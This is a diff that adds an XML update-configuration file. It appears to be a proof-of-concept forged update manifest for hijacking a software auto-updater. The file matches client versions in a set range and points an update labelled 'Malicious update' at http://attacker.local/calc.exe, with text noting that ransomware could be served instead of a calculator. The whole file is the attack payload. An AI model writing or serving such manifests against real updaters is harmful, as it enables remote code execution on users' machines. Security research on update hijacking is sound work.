@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8"?>
+<UpdateConfig>
+	<GlobalConfig>
+		<Item name="UpdateEnable" Value="1" />
+	</GlobalConfig>
+	<UpdatePolicy>
+		<PolicyItem id="1" Enable="1" AutoUpdateRate="1" ManualUpdateRate="100" MatchUpdateOperation="2" Weight="4">
+			<Condition Method="Or">
+				<MatchSupplyId Type="market" MatchResult="0" Start="3.10.199.100" End="4.99.999.999" />
+			</Condition>
+		</PolicyItem>
+	</UpdatePolicy>
+	<UpdateOperation>
+		<OperItem id="2" inherit="0" Desc="This is a malicious update" Title="Malicious update" text="I could serve you ransomware but I'll just spawn calc">
+			<Item Type="market" url="http://attacker.local/calc.exe" md5="c4cb4fdf6369dd1342d2666171866ce5" version="5.10.199.100" filesize="32768" />
+		</OperItem>
+	</UpdateOperation>
+</UpdateConfig>
